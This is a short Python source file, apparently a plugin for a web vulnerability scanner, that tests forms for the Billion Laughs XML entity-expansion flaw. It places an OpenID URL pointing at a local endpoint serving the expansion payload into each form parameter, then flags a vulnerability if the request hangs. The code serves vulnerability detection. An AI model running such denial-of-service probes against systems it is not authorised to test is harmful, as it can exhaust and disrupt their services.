from ..utils import attack, modify_parameter
import time
import multiprocessing

OPENID_URL = "http://localhost:8080"
OPENID_URL_BILLION_LAUGHS = "http://localhost:8080/db"


def search(page):
    for form in page.get_forms():
        yield (form,)


@attack(search)
def billion_laughs(client, log, form):
    parameters = dict(form.get_parameters())
    for parameter in parameters:
        print parameters
        attack_parameters = modify_parameter(parameters, parameter,
                                             OPENID_URL)
        startTime = time.time()
        result = form.send(client, attack_parameters)
        endTime = time.time()
        elapsedTime = endTime - startTime
        attack_parameters = modify_parameter(parameters, parameter,
                                             OPENID_URL_BILLION_LAUGHS)

        p = multiprocessing.Process(
            target=form.send, args=(client, attack_parameters))
        p.start()
        p.join(elapsedTime + 2)
        if p.is_alive():
            log('vuln', result.url, "Billion Laughs", "in URL parameter " + parameter)
            p.terminate()
            p.join()
